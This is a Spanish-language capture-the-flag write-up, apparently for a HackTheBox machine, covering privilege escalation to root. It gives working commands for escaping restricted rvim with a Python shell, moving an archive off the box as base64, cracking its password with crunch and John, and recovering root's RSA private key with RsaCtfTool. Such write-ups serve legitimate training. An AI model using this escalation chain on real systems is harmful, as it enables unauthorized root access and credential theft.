## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
sudo -l
```

Aqui vemos que podriamos ejecutar el `/usr/bin/rvim` del fichero `/var/www/html/jailuser/dev/jail.c` como el usuario adm sin proporcionar contraseña.

```bash
sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c

:!/bin/sh
#Output 
No se permite orden de consola en rvim

:set shell = /bin/bash
:shell
```

Aqui vemos que no podemos ejecutar comandos pero lo bueno es que rvim permite ejecutar codigo en python

```bash
:py import pty;pty.spawn("/bin/bash")
whoami 
#Output
adm
```

Aqui vemos que estamos en el directorio `/var/adm`

```bash
ls -la
cd .keys
ls -la
cat note.txt
```

Vemos un mensaje del Administrator a frank diciendole que su contraseña para encryptar cosas tiene que ser sur segundo nombre seguido de 4 digitos y un simbolo.

```bash
cd .local
ls -la
cat .frank
#Output
Szszsz! Mlylwb droo tfvhh nb mvd kzhhdliw! Lmob z uvd ofxpb hlfoh szev Vhxzkvw uiln Zoxzgiza zorev orpv R wrw!!!
```

Lanzamos la web de [quipqiup](https://www.quipqiup.com/) y copiamos el mensaje y nos lo traduce por 
**Hahaha! Nobody will guess my new password! Only a few lucky souls have Escaped from Alcatraz alive like I did!!!**

Tambien hay un `keys.rar`.

Lo codificamos en base64 y nos lo tranferimos a nuestra maquina de atacante.

```bash
base64 -w 0 keys.rar; echo
```

y desde la maquina de atacante no copiamos el base64 y lo decodificamos

```bash
echo "hash de base64" | base64 -d > keys.rar
unrar x keys.rar
```

Aqui nos pide una contraseña para unrarear el `keys.rar` y buscando por internet Alcatraz Escape vemos que un Frank Morris se escapo de Alcatraz en 1962.
Vamos a tirar de la utilidad de crunch para crackear la contraseña.

```bash
crunch 11 11 -t Morris1962^ > passwords
rar2john keys.rar > hash
john --wordlist=passwords hash
```

Encontramos la contraseña `Morris1962!`

```bash
unrar x keys.rar
Password: Morris1962!
mv rootauthorizedsshkey.pub id_rsa.pub
cat id_rsa.pub
```

aqui vemos la key publica del usuario root, pero no podemos hacer gran cosa con la key publica. Como no parece muy grande, intentamos ver si podemos computar la llave
privada des esta key.

```python
python3

from Crypto.PublicKey import RSA
f = open ("id_rsa.pub", "r")
key = RSA.importKey(f.read())
print(key.n)
print(key.p)
print(key.q)
print(key.e)
```

Aqui como `key.n` es demasiado grande, no a sido posible computar `key.p` o `key.q` que nos ubiera permitido intentar generar una private key.

Miramos si podemos hacerlo desde [factordb](http://factordb.com/) pero es lo mismo. Pero existen webs para los ctf como [RsaCtfTool](https://github.com/Ganapati/RsaCtfTool)
que podemos usar.

```bash
git clone https://github.com/Ganapati/RsaCtfTool
cd RsaCtfTool
python3 RsaCtfTool.py --publickey id_rsa.pub --private
```

Esperamos un poco y podemos ver la id_rsa. Lo copiamos en un ficher id_rsa y nos conectamos por ssh.

```bash
nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@10.10.10.34
```

Ya somos root y podemos leer la flag.
